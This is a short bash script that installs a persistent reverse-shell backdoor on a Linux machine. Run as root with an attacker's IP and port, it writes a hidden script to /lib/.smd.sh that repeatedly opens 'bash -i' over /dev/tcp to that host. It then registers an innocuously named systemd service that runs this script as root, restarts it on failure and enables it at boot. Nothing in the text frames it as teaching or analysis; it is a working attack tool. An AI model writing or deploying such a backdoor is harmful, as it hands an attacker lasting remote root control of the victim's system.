#! /bin/bash

if [[ $(whoami) != "root" ]]; then
	echo "Premission denied! Please run this as root user"
	exit 1
fi

ip=$1
port=$2

touch /lib/.smd.sh

cat <<EOF >/lib/.smd.sh
#!/bin/bash
while [[ true ]]; do
        bash -i >& /dev/tcp/$ip/$port 0>&1
        sleep  5
done
EOF

touch /etc/systemd/system/smd.service
cat <<EOF >/etc/systemd/system/smd.service
[Unit]                                                  
Description=Drax                                        
After=network.target                                    
StartLimitIntervalSec=0                                 
                                                        
[Service]                                               
Type=simple                                             
ExecStart=/bin/bash /lib/.smd.sh                  

User=root

Environment=ENV=production

Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
~
EOF

$(sudo systemctl enable smd)
$(sudo systemctl start smd)
